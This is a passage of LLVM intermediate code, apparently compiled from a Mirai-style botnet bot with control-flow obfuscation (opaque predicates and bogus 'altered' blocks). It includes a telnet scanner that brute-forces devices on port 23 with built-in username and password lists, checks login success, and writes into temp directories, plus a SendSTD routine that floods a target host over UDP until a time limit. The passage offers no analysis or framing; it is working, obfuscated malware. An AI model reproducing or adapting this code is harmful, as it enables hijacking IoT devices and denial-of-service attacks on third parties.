  %1318 = sext i32 %1317 to i64
  %1319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1318
  %1320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1319, i32 0, i32 4
  %1321 = load i8, i8* %1320, align 2
  %1322 = zext i8 %1321 to i64
  %1323 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Usernames, i64 0, i64 %1322
  %1324 = load i8*, i8** %1323, align 8
  %1325 = load i32, i32* %6, align 4
  %1326 = sext i32 %1325 to i64
  %1327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1326
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1327, i32 0, i32 5
  %1329 = load i8, i8* %1328, align 1
  %1330 = zext i8 %1329 to i64
  %1331 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %1330
  %1332 = load i8*, i8** %1331, align 8
  %1333 = call i32 (i32, i8*, ...) @sockprintf(i32 %1312, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.498, i32 0, i32 0), i8* %1316, i8* %1324, i8* %1332)
  br label %1334

; <label>:1334:                                   ; preds = %1311, %1303
  %1335 = load i32, i32* %6, align 4
  %1336 = sext i32 %1335 to i64
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1336
  call void @reset_telstate(%struct.telstate_t* %1337)
  br label %1338

; <label>:1338:                                   ; preds = %1334, %1293
  %1339 = load i32, i32* @x.73
  %1340 = load i32, i32* @y.74
  %1341 = sub i32 %1339, 1
  %1342 = mul i32 %1339, %1341
  %1343 = urem i32 %1342, 2
  %1344 = icmp eq i32 %1343, 0
  %1345 = icmp slt i32 %1340, 10
  %1346 = or i1 %1344, %1345
  br i1 %1346, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1338
  %1347 = load i32, i32* @x.73
  %1348 = load i32, i32* @y.74
  %1349 = sub i32 %1347, 1
  %1350 = mul i32 %1347, %1349
  %1351 = urem i32 %1350, 2
  %1352 = icmp eq i32 %1351, 0
  %1353 = icmp slt i32 %1348, 10
  %1354 = or i1 %1352, %1353
  br i1 %1354, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %1355

; <label>:1355:                                   ; preds = %originalBBpart2136, %1120, %1047, %originalBBpart2100, %originalBBpart292, %703, %661, %529, %376, %154
  %1356 = load i32, i32* @x.73
  %1357 = load i32, i32* @y.74
  %1358 = sub i32 %1356, 1
  %1359 = mul i32 %1356, %1358
  %1360 = urem i32 %1359, 2
  %1361 = icmp eq i32 %1360, 0
  %1362 = icmp slt i32 %1357, 10
  %1363 = or i1 %1361, %1362
  br i1 %1363, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %1355
  %1364 = load i32, i32* @x.73
  %1365 = load i32, i32* @y.74
  %1366 = sub i32 %1364, 1
  %1367 = mul i32 %1364, %1366
  %1368 = urem i32 %1367, 2
  %1369 = icmp eq i32 %1368, 0
  %1370 = icmp slt i32 %1365, 10
  %1371 = or i1 %1369, %1370
  br i1 %1371, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  br label %1372

; <label>:1372:                                   ; preds = %originalBBpart2140, %originalBBpart2132, %1116, %1077, %1032, %844, %832, %759, %699, %687, %originalBBpart261, %originalBBpart245, %474, %341, %originalBBpart233
  %1373 = load i32, i32* @x.73
  %1374 = load i32, i32* @y.74
  %1375 = sub i32 %1373, 1
  %1376 = mul i32 %1373, %1375
  %1377 = urem i32 %1376, 2
  %1378 = icmp eq i32 %1377, 0
  %1379 = icmp slt i32 %1374, 10
  %1380 = or i1 %1378, %1379
  br i1 %1380, label %originalBB142, label %originalBB142alteredBB

originalBB142:                                    ; preds = %originalBB142alteredBB, %1372
  %1381 = load i32, i32* %6, align 4
  %1382 = add nsw i32 %1381, 1
  store i32 %1382, i32* %6, align 4
  %1383 = load i32, i32* @x.73
  %1384 = load i32, i32* @y.74
  %1385 = sub i32 %1383, 1
  %1386 = mul i32 %1383, %1385
  %1387 = urem i32 %1386, 2
  %1388 = icmp eq i32 %1387, 0
  %1389 = icmp slt i32 %1384, 10
  %1390 = or i1 %1388, %1389
  br i1 %1390, label %originalBBpart2146, label %originalBB142alteredBB

originalBBpart2146:                               ; preds = %originalBB142
  br label %120

; <label>:1391:                                   ; preds = %originalBBpart212
  %1392 = load i32, i32* @x.73
  %1393 = load i32, i32* @y.74
  %1394 = sub i32 %1392, 1
  %1395 = mul i32 %1392, %1394
  %1396 = urem i32 %1395, 2
  %1397 = icmp eq i32 %1396, 0
  %1398 = icmp slt i32 %1393, 10
  %1399 = or i1 %1397, %1398
  br i1 %1399, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %1391
  %1400 = load i32, i32* @x.73
  %1401 = load i32, i32* @y.74
  %1402 = sub i32 %1400, 1
  %1403 = mul i32 %1400, %1402
  %1404 = urem i32 %1403, 2
  %1405 = icmp eq i32 %1404, 0
  %1406 = icmp slt i32 %1401, 10
  %1407 = or i1 %1405, %1406
  br i1 %1407, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  br label %102
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %32
  %1409 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %1409, align 4
  %1410 = call zeroext i16 @htons(i16 zeroext 23) #10
  %1411 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %1410, i16* %1411, align 2
  %1412 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %1413 = getelementptr inbounds [8 x i8], [8 x i8]* %1412, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1413, i8 0, i64 8, i32 4, i1 false)
  %1414 = call noalias i8* @malloc(i64 1025) #5
  store i8* %1414, i8** %17, align 8
  %1415 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %1415, i8 0, i64 1025, i32 1, i1 false)
  %1416 = load i32, i32* %5, align 4
  %1417 = zext i32 %1416 to i64
  %1418 = call i8* @llvm.stacksave()
  store i8* %1418, i8** %19, align 8
  %1419 = alloca %struct.telstate_t, i64 %1417, align 16
  %1420 = bitcast %struct.telstate_t* %1419 to i8*
  %1421 = load i32, i32* %5, align 4
  %1422 = sext i32 %1421 to i64
  %_ = sub i64 0, %1422
  %gen = add i64 %_, 5
  %1423 = mul i64 %1422, 5
  call void @llvm.memset.p0i8.i64(i8* %1420, i8 0, i64 %1423, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %85
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %103
  store i32 0, i32* %6, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %120
  %1424 = load i32, i32* %6, align 4
  %1425 = load i32, i32* %5, align 4
  %1426 = icmp slt i32 %1424, %1425
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %189
  %1427 = load i32, i32* %6, align 4
  %1428 = sext i32 %1427 to i64
  %1429 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1428
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1429, i32 0, i32 3
  %1431 = load i8, i8* %1430, align 1
  %1432 = zext i8 %1431 to i32
  %1433 = icmp eq i32 %1432, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %213
  %1434 = load i32, i32* %6, align 4
  %1435 = sext i32 %1434 to i64
  %1436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1435
  %1437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1436, i32 0, i32 4
  %1438 = load i8, i8* %1437, align 2
  %_19 = sub i8 %1438, 1
  %gen20 = mul i8 %_19, 1
  %1439 = add i8 %1438, 1
  store i8 %1439, i8* %1437, align 2
  %1440 = load i32, i32* %6, align 4
  %1441 = sext i32 %1440 to i64
  %1442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1441
  %1443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1442, i32 0, i32 5
  %1444 = load i8, i8* %1443, align 1
  %_21 = shl i8 %1444, 1
  %_22 = shl i8 %1444, 1
  %_23 = shl i8 %1444, 1
  %1445 = add i8 %1444, 1
  store i8 %1445, i8* %1443, align 1
  %1446 = load i32, i32* %6, align 4
  %1447 = sext i32 %1446 to i64
  %1448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1447
  %1449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1448, i32 0, i32 5
  %1450 = load i8, i8* %1449, align 1
  %1451 = zext i8 %1450 to i64
  %1452 = icmp eq i64 %1451, 1
  br label %originalBB18

originalBB27alteredBB:                            ; preds = %originalBB27, %254
  %1453 = load i32, i32* %6, align 4
  %1454 = sext i32 %1453 to i64
  %1455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1454
  %1456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1455, i32 0, i32 4
  %1457 = load i8, i8* %1456, align 2
  %1458 = zext i8 %1457 to i64
  %1459 = icmp eq i64 %1458, 1
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %278
  %1460 = load i32, i32* %6, align 4
  %1461 = sext i32 %1460 to i64
  %1462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1461
  %1463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1462, i32 0, i32 3
  store i8 1, i8* %1463, align 1
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %300
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %421
  %1464 = call i64 @time(i64* null) #5
  %1465 = trunc i64 %1464 to i32
  %1466 = load i32, i32* %6, align 4
  %1467 = sext i32 %1466 to i64
  %1468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1467
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1468, i32 0, i32 7
  store i32 %1465, i32* %1469, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %1470 = load i32, i32* %6, align 4
  %1471 = sext i32 %1470 to i64
  %1472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1471
  %1473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1472, i32 0, i32 0
  %1474 = load i32, i32* %1473, align 16
  %1475 = bitcast i32* %15 to i8*
  %1476 = call i32 @getsockopt(i32 %1474, i32 1, i32 4, i8* %1475, i32* %14) #5
  %1477 = load i32, i32* %15, align 4
  %1478 = icmp ne i32 %1477, 0
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %478
  %1479 = load i32, i32* %6, align 4
  %1480 = sext i32 %1479 to i64
  %1481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1480
  call void @reset_telstate(%struct.telstate_t* %1481)
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %509
  %1482 = load i32, i32* %6, align 4
  %1483 = sext i32 %1482 to i64
  %1484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1483
  call void @reset_telstate(%struct.telstate_t* %1484)
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %544
  %1485 = call i64 @time(i64* null) #5
  %1486 = trunc i64 %1485 to i32
  %1487 = load i32, i32* %6, align 4
  %1488 = sext i32 %1487 to i64
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1488
  %1490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1489, i32 0, i32 7
  store i32 %1486, i32* %1490, align 16
  %1491 = load i32, i32* %6, align 4
  %1492 = sext i32 %1491 to i64
  %1493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1492
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1493, i32 0, i32 9
  %1495 = load i8*, i8** %1494, align 8
  %1496 = call i32 @contains_fail(i8* %1495)
  %1497 = icmp ne i32 %1496, 0
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %574
  %1498 = load i32, i32* %6, align 4
  %1499 = sext i32 %1498 to i64
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1499
  call void @advance_telstate(%struct.telstate_t* %1500, i32 0)
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %598
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %615
  %1501 = load i32, i32* %6, align 4
  %1502 = sext i32 %1501 to i64
  %1503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1502
  %1504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1503, i32 0, i32 7
  %1505 = load i32, i32* %1504, align 16
  %_64 = shl i32 %1505, 7
  %_65 = sub i32 0, %1505
  %gen66 = add i32 %_65, 7
  %_67 = sub i32 %1505, 7
  %gen68 = mul i32 %_67, 7
  %_69 = sub i32 0, %1505
  %gen70 = add i32 %_69, 7
  %_71 = shl i32 %1505, 7
  %_72 = sub i32 %1505, 7
  %gen73 = mul i32 %_72, 7
  %_74 = sub i32 0, %1505
  %gen75 = add i32 %_74, 7
  %_76 = sub i32 0, %1505
  %gen77 = add i32 %_76, 7
  %_78 = shl i32 %1505, 7
  %1506 = add i32 %1505, 7
  %1507 = zext i32 %1506 to i64
  %1508 = call i64 @time(i64* null) #5
  %1509 = icmp slt i64 %1507, %1508
  br label %originalBB63

originalBB82alteredBB:                            ; preds = %originalBB82, %641
  %1510 = load i32, i32* %6, align 4
  %1511 = sext i32 %1510 to i64
  %1512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1511
  call void @reset_telstate(%struct.telstate_t* %1512)
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %739
  %1513 = load i32, i32* %6, align 4
  %1514 = sext i32 %1513 to i64
  %1515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1514
  call void @advance_telstate(%struct.telstate_t* %1515, i32 5)
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %774
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %791
  %1516 = load i32, i32* %6, align 4
  %1517 = sext i32 %1516 to i64
  %1518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1517
  %1519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1518, i32 0, i32 0
  %1520 = load i32, i32* %1519, align 16
  %1521 = load i32, i32* %6, align 4
  %1522 = sext i32 %1521 to i64
  %1523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1522
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1523, i32 0, i32 5
  %1525 = load i8, i8* %1524, align 1
  %1526 = zext i8 %1525 to i64
  %1527 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %1526
  %1528 = load i8*, i8** %1527, align 8
  %1529 = load i32, i32* %6, align 4
  %1530 = sext i32 %1529 to i64
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1530
  %1532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1531, i32 0, i32 5
  %1533 = load i8, i8* %1532, align 1
  %1534 = zext i8 %1533 to i64
  %1535 = getelementptr inbounds [1 x i8*], [1 x i8*]* @Mirai_Passwords, i64 0, i64 %1534
  %1536 = load i8*, i8** %1535, align 8
  %1537 = call i64 @strlen(i8* %1536) #9
  %1538 = call i64 @send(i32 %1520, i8* %1528, i64 %1537, i32 16384)
  %1539 = icmp slt i64 %1538, 0
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %848
  %1540 = load i32, i32* %6, align 4
  %1541 = sext i32 %1540 to i64
  %1542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1541
  call void @advance_telstate(%struct.telstate_t* %1542, i32 6)
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %882
  %1543 = call i64 @time(i64* null) #5
  %1544 = trunc i64 %1543 to i32
  %1545 = load i32, i32* %6, align 4
  %1546 = sext i32 %1545 to i64
  %1547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1546
  %1548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1547, i32 0, i32 7
  store i32 %1544, i32* %1548, align 16
  %1549 = load i32, i32* %6, align 4
  %1550 = sext i32 %1549 to i64
  %1551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1550
  %1552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1551, i32 0, i32 9
  %1553 = load i8*, i8** %1552, align 8
  %1554 = call i32 @contains_fail(i8* %1553)
  %1555 = icmp ne i32 %1554, 0
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %916
  %1556 = load i32, i32* %6, align 4
  %1557 = sext i32 %1556 to i64
  %1558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1557
  %1559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1558, i32 0, i32 9
  %1560 = load i8*, i8** %1559, align 8
  %1561 = call i32 @contains_success(i8* %1560)
  %1562 = icmp ne i32 %1561, 0
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %948
  %1563 = load i32, i32* %6, align 4
  %1564 = sext i32 %1563 to i64
  %1565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1564
  call void @advance_telstate(%struct.telstate_t* %1565, i32 7)
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %994
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %1011
  %1566 = load i32, i32* %6, align 4
  %1567 = sext i32 %1566 to i64
  %1568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1567
  call void @reset_telstate(%struct.telstate_t* %1568)
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1048
  %1569 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1570 = call i32 (i8*, i8*, ...) @sprintf(i8* %1569, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.489, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %1571 = load i32, i32* %6, align 4
  %1572 = sext i32 %1571 to i64
  %1573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1572
  %1574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1573, i32 0, i32 0
  %1575 = load i32, i32* %1574, align 16
  %1576 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1577 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %1578 = call i64 @strlen(i8* %1577) #9
  %1579 = call i64 @send(i32 %1575, i8* %1576, i64 %1578, i32 16384)
  %1580 = icmp slt i64 %1579, 0
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1146
  %1581 = call i64 @time(i64* null) #5
  %1582 = trunc i64 %1581 to i32
  %1583 = load i32, i32* %6, align 4
  %1584 = sext i32 %1583 to i64
  %1585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1584
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1585, i32 0, i32 7
  store i32 %1582, i32* %1586, align 16
  %1587 = load i32, i32* %6, align 4
  %1588 = sext i32 %1587 to i64
  %1589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1588
  %1590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1589, i32 0, i32 0
  %1591 = load i32, i32* %1590, align 16
  %1592 = call i64 @send(i32 %1591, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.493, i32 0, i32 0), i64 4, i32 16384)
  %1593 = icmp slt i64 %1592, 0
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1197
  %1594 = load i32, i32* %6, align 4
  %1595 = sext i32 %1594 to i64
  %1596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %1595
  call void @reset_telstate(%struct.telstate_t* %1596)
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1338
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1355
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1372
  %1597 = load i32, i32* %6, align 4
  %_143 = sub i32 0, %1597
  %gen144 = add i32 %_143, 1
  %1598 = add nsw i32 %1597, 1
  store i32 %1598, i32* %6, align 4
  br label %originalBB142

originalBB148alteredBB:                           ; preds = %originalBB148, %1391
  br label %originalBB148
}

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.75
  %5 = load i32, i32* @y.76
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.hostent*, align 8
  %19 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %20 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %20, i32* %15, align 4
  %21 = call i64 @time(i64* null) #5
  store i64 %21, i64* %16, align 8
  %22 = load i8*, i8** %12, align 8
  %23 = call %struct.hostent* @gethostbyname(i8* %22)
  store %struct.hostent* %23, %struct.hostent** %18, align 8
  %24 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %24, i8 0, i64 16, i32 4, i1 false)
  %25 = load %struct.hostent*, %struct.hostent** %18, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 4
  %27 = load i8**, i8*** %26, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %31 = bitcast %struct.in_addr* %30 to i8*
  %32 = load %struct.hostent*, %struct.hostent** %18, align 8
  %33 = getelementptr inbounds %struct.hostent, %struct.hostent* %32, i32 0, i32 3
  %34 = load i32, i32* %33, align 4
  %35 = sext i32 %34 to i64
  call void @bcopy(i8* %29, i8* %31, i64 %35) #5
  %36 = load %struct.hostent*, %struct.hostent** %18, align 8
  %37 = getelementptr inbounds %struct.hostent, %struct.hostent* %36, i32 0, i32 2
  %38 = load i32, i32* %37, align 8
  %39 = trunc i32 %38 to i16
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 %39, i16* %40, align 4
  %41 = load i32, i32* %13, align 4
  %42 = trunc i32 %41 to i16
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %42, i16* %43, align 2
  store i32 0, i32* %19, align 4
  %44 = load i32, i32* @x.75
  %45 = load i32, i32* @y.76
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %52

; <label>:52:                                     ; preds = %87, %originalBBpart2
  %53 = load i32, i32* @x.75
  %54 = load i32, i32* @y.76
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = load i32, i32* %19, align 4
  %62 = icmp uge i32 %61, 50
  %63 = load i32, i32* @x.75
  %64 = load i32, i32* @y.76
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %62, label %71, label %87

; <label>:71:                                     ; preds = %originalBBpart24
  %72 = load i32, i32* %15, align 4
  %73 = call i64 @send(i32 %72, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.500, i32 0, i32 0), i64 65, i32 0)
  %74 = load i32, i32* %15, align 4
  %75 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %76 = call i32 @connect(i32 %74, %struct.sockaddr* %75, i32 16)
  %77 = call i64 @time(i64* null) #5
  %78 = load i64, i64* %16, align 8
  %79 = load i32, i32* %14, align 4
  %80 = sext i32 %79 to i64
  %81 = add nsw i64 %78, %80
  %82 = icmp sge i64 %77, %81
  br i1 %82, label %83, label %86

; <label>:83:                                     ; preds = %71
  %84 = load i32, i32* %15, align 4
  %85 = call i32 @close(i32 %84)
  call void @_exit(i32 0) #11
  unreachable

; <label>:86:                                     ; preds = %71
  store i32 0, i32* %19, align 4
  br label %87

; <label>:87:                                     ; preds = %86, %originalBBpart24
  %88 = load i32, i32* %19, align 4
  %89 = add i32 %88, 1
  store i32 %89, i32* %19, align 4
  br label %52
                                                  ; No predecessors!
  %91 = load i32, i32* @x.75
  %92 = load i32, i32* @y.76
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %90
  %99 = load i32, i32* @x.75
  %100 = load i32, i32* @y.76
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %107 = alloca i8*, align 8
  %108 = alloca i32, align 4
  %109 = alloca i32, align 4
  %110 = alloca i32, align 4
  %111 = alloca i64, align 8
  %112 = alloca %struct.sockaddr_in, align 4
  %113 = alloca %struct.hostent*, align 8
  %114 = alloca i32, align 4
  store i8* %0, i8** %107, align 8
  store i32 %1, i32* %108, align 4
  store i32 %2, i32* %109, align 4
  %115 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %115, i32* %110, align 4
  %116 = call i64 @time(i64* null) #5
  store i64 %116, i64* %111, align 8
  %117 = load i8*, i8** %107, align 8
  %118 = call %struct.hostent* @gethostbyname(i8* %117)
  store %struct.hostent* %118, %struct.hostent** %113, align 8
  %119 = bitcast %struct.sockaddr_in* %112 to i8*
  call void @llvm.memset.p0i8.i64(i8* %119, i8 0, i64 16, i32 4, i1 false)
  %120 = load %struct.hostent*, %struct.hostent** %113, align 8
  %121 = getelementptr inbounds %struct.hostent, %struct.hostent* %120, i32 0, i32 4
  %122 = load i8**, i8*** %121, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 0
  %124 = load i8*, i8** %123, align 8
  %125 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %112, i32 0, i32 2
  %126 = bitcast %struct.in_addr* %125 to i8*
  %127 = load %struct.hostent*, %struct.hostent** %113, align 8
  %128 = getelementptr inbounds %struct.hostent, %struct.hostent* %127, i32 0, i32 3
  %129 = load i32, i32* %128, align 4
  %130 = sext i32 %129 to i64
  call void @bcopy(i8* %124, i8* %126, i64 %130) #5
  %131 = load %struct.hostent*, %struct.hostent** %113, align 8
  %132 = getelementptr inbounds %struct.hostent, %struct.hostent* %131, i32 0, i32 2
  %133 = load i32, i32* %132, align 8
  %134 = trunc i32 %133 to i16
  %135 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %112, i32 0, i32 0
  store i16 %134, i16* %135, align 4
  %136 = load i32, i32* %108, align 4
  %137 = trunc i32 %136 to i16
  %138 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %112, i32 0, i32 1
  store i16 %137, i16* %138, align 2
  store i32 0, i32* %114, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %139 = load i32, i32* %19, align 4
  %140 = icmp uge i32 %139, 50
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %90
  br label %originalBB6
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
